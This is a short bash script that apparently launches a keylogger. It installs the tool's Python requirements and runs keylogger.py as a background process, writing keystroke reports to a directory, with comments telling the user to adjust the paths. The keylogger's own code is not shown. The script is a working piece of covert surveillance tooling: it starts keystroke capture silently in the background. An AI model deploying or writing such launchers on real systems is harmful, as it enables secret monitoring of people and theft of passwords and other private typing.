#!/bin/bash
sleep 1
PATH=/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export DISPLAY=:0.0

pip3 install -r  /home/hacker/Bureau/keylogger/requirements.txt #change the path to your directory
(python3 /home/hacker/Bureau/keylogger/keylogger.py /home/hacker/Bureau/keylogger/)& # the first directory is the location of the keylogger.py, the second is where you will find the kelogger report
